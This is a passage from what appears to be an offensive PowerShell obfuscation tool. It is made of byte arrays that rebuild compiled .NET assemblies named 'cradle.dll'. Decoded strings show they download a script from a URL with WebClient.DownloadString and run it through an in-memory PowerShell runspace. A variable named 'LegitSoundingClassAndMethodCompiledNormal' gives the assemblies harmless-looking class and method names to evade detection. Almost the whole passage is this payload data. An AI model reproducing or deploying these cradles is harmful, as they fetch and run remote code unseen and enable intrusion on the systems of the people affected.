120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,117,114,108,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,0,3,32,0,0,0,0,0,79,221,68,140,66,226,19,75,185,172,227,137,216,29,126,59,0,8,183,122,92,86,25,52,224,137,4,0,1,14,14,3,32,0,1,4,32,1,1,8,4,32,1,14,14,3,7,1,14,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,0,0,72,35)+@(0)*8+@(0,0,94,35,0,0,0,32)+@(0)*22+@(80,35)+@(0)*8+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,64)+@(0)*155+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,112,51)+@(0)*502","$CompiledHeader`219,36,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,238,36,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(156,36,0,0,79,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,244,4,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(208,36,0,0,0,0,0,0,72,0,0,0,2,0,5,0,156,32,0,0,0,4,0,0,1)+@(0)*55+@(19,48,3,0,54,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,111,9,0,0,10,38,7,111,10,0,0,10,38,42,30,2,40,11,0,0,10,42,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,100,1,0,0,35,126,0,0,208,1,0,0,164,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,116,3,0,0,8,0,0,0,35,85,83,0,124,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,140,3,0,0,116,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,9,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,11,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,43,0,36,0,6,0,99,0,67,0,6,0,131,0,67,0,10,0,236,0,197,0,10,0,252,0,197,0,10,0,25,1,168,0,14,0,67,1,56,1,6,0,133,1,102,1,10,0,146,1,168,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,50,0,10,0,1,0,146,32,0,0,0,0,134,24,57,0,15,0,2,0,0,0,1,0,63,0,17,0,57,0,19,0,25,0,57,0,15,0,33,0,5,1,33,0,41,0,20,1,15,0,49,0,36,1,38,0,49,0,43,1,43,0,57,0,57,0,15,0,57,0,77,1,49,0,49,0,92,1,54,0,49,0,155,1,60,0,9,0,57,0,15,0,46,0,11,0,76,0,46,0,19,0,85,0,69,0,4,128)+@(0)*16+@(161,0,0,0,4)+@(0)*11+@(1,0,27,0,0,0,0,0,3)+@(0)*11+@(24,0,168,0,0,0,0,0,4)+@(0)*11+@(1,0,36)+@(0)*8+@(0,0,60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,67,108,97,115,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,77,101,116,104,111,100,0,46,99,116,111,114,0,117,114,108,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,0,3,32,0,0,0,0,0,182,164,244,58,171,215,81,64,152,98,124,71,116,109,72,160,0,8,183,122,92,86,25,52,224,137,4,0,1,1,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,5,32,1,18,25,14,8,32,0,21,18,33,1,18,37,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,196,36)+@(0)*8+@(0,0,222,36,0,0,0,32)+@(0)*22+@(208,36)+@(0)*12+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*282+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,240,52)+@(0)*502","$CompiledHeader`9,37,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,46,37,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(224,36,0,0,75,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,52,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(16,37,0,0,0,0,0,0,72,0,0,0,2,0,5,0,168,32,0,0,56,4,0,0,1)+@(0)*55+@(19,48,4,0,65,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,114,1,0,0,112,3,40,9,0,0,10,111,10,0,0,10,38,7,111,11,0,0,10,38,42,30,2,40,12,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,116,1,0,0,35,126,0,0,224,1,0,0,196,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,164,3,0,0,8,0,0,0,35,85,83,0,172,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,188,3,0,0,124,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,10,0,0,0,2,0,0,0,2,0,0,0,2,0,0,0,12,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,43,0,36,0,6,0,117,0,85,0,6,0,149,0,85,0,10,0,254,0,215,0,10,0,14,1,215,0,10,0,43,1,186,0,14,0,85,1,74,1,6,0,110,1,36,0,6,0,165,1,134,1,10,0,178,1,186,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,50,0,10,0,1,0,157,32,0,0,0,0,134,24,57,0,16,0,3,0,0,0,1,0,63,0,0,0,2,0,67,0,17,0,57,0,20,0,25,0,57,0,16,0,33,0,23,1,34,0,41,0,38,1,16,0,49,0,54,1,39,0,49,0,61,1,44,0,57,0,57,0,16,0,57,0,95,1,50,0,65,0,117,1,55,0,49,0,124,1,62,0,49,0,187,1,68,0,9,0,57,0,16,0,46,0,11,0,84,0,46,0,19,0,93,0,77,0,4,128)+@(0)*16+@(179,0,0,0,4)+@(0)*11+@(1,0,27,0,0,0,0,0,3)+@(0)*11+@(25,0,186,0,0,0,0,0,4)+@(0)*11+@(1,0,36)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,67,108,97,115,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,77,101,116,104,111,100,0,46,99,116,111,114,0,117,114,108,0,112,111,115,116,99,114,97,100,108,101,99,111,109,109,97,110,100,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,83,116,114,105,110,103,0,67,111,110,99,97,116,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,0,3,59,0,0,0,0,0,197,255,126,57,108,127,123,69,148,31,68,179,80,223,89,237,0,8,183,122,92,86,25,52,224,137,5,0,2,1,14,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,6,0,3,14,14,14,14,5,32,1,18,25,14,8,32,0,21,18,37,1,18,41,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,8,37)+@(0)*8+@(0,0,30,37,0,0,0,32)+@(0)*22+@(16,37)+@(0)*8+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*218+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,48,53)+@(0)*502"))

    $LegitSoundingClassAndMethodCompiledNormal   =   @()
    $LegitSoundingClassAndMethodCompiledNormal  += , @('Arrays'        , 'Equals'            , @("$CompiledHeader`156,51,17,89)+@(0)*8+@(224,0,2,33,11,1,8,0,0,4,0,0,0,6,0,0,0,0,0,0,126,35,0,0,0,32,0,0,0,64,0,0,0,0,64,0,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(36,35,0,0,87,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,132,3,0,0,0,32,0,0,0,4,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,6)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,10)+@(0)*14+@(64,0,0,66)+@(0)*16+@(96,35,0,0,0,0,0,0,72,0,0,0,2,0,5,0,120,32,0,0,172,2,0,0,1)+@(0)*55+@(19,48,2,0,17,0,0,0,1,0,0,17,0,115,3,0,0,10,2,40,4,0,0,10,10,43,0,6,42,30,2,40,5,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,50,46,48,46,53,48,55,50,55,0,0,0,0,5,0,108,0,0,0,12,1,0,0,35,126,0,0,120,1,0,0,208,0,0,0,35,83,116,114,105,110,103,115,0,0,0,0,72,2,0,0,8,0,0,0,35,85,83,0,80,2,0,0,16,0,0,0,35,71,85,73,68,0,0,0,96,2,0,0,76,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,1,51,0,22,0,0,1,0,0,0,4,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,5,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,2,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,44,0,37,0,6,0,96,0,64,0,6,0,128,0,64,0,10,0,180,0,169,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,51,0,10,0,1,0,109,32,0,0,0,0,134,24,58,0,15,0,2,0,0,0,1,0,165,0,17,0,58,0,19,0,25,0,58,0,15,0,33,0,58,0,15,0,33,0,190,0,24,0,9,0,58,0,15,0,46,0,11,0,33,0,46,0,19,0,42,0,29,0,4,128)+@(0)*16+@(158,0,0,0,2)+@(0)*11+@(1,0,28,0,0,0,0,0,2)+@(0)*11+@(1,0,37)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,65,114,114,97,121,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,69,113,117,97,108,115,0,46,99,116,111,114,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,117,114,108,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,0,0,0,0,3,32,0,0,0,0,0,181,37,186,121,118,173,48,67,189,249,197,71,80,33,143,60,0,8,183,122,92,86,25,52,224,137,4,0,1,14,14,3,32,0,1,4,32,1,1,8,4,32,1,14,14,3,7,1,14,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,0,0,76,35)+@(0)*8+@(0,0,110,35,0,0,0,32)+@(0)*22+@(96,35)+@(0)*20+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,64)+@(0)*139+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,128,51)+@(0)*502","$CompiledHeader`166,51,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,238,36,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(156,36,0,0,79,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,244,4,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(208,36,0,0,0,0,0,0,72,0,0,0,2,0,5,0,156,32,0,0,0,4,0,0,1)+@(0)*55+@(19,48,3,0,54,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,111,9,0,0,10,38,7,111,10,0,0,10,38,42,30,2,40,11,0,0,10,42,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,100,1,0,0,35,126,0,0,208,1,0,0,164,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,116,3,0,0,8,0,0,0,35,85,83,0,124,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,140,3,0,0,116,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,9,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,11,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,44,0,37,0,6,0,100,0,68,0,6,0,132,0,68,0,10,0,237,0,198,0,10,0,253,0,198,0,10,0,26,1,169,0,14,0,68,1,57,1,6,0,134,1,103,1,10,0,147,1,169,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,51,0,10,0,1,0,146,32,0,0,0,0,134,24,58,0,15,0,2,0,0,0,1,0,64,0,17,0,58,0,19,0,25,0,58,0,15,0,33,0,6,1,33,0,41,0,21,1,15,0,49,0,37,1,38,0,49,0,44,1,43,0,57,0,58,0,15,0,57,0,78,1,49,0,49,0,93,1,54,0,49,0,156,1,60,0,9,0,58,0,15,0,46,0,11,0,76,0,46,0,19,0,85,0,69,0,4,128)+@(0)*16+@(162,0,0,0,4)+@(0)*11+@(1,0,28,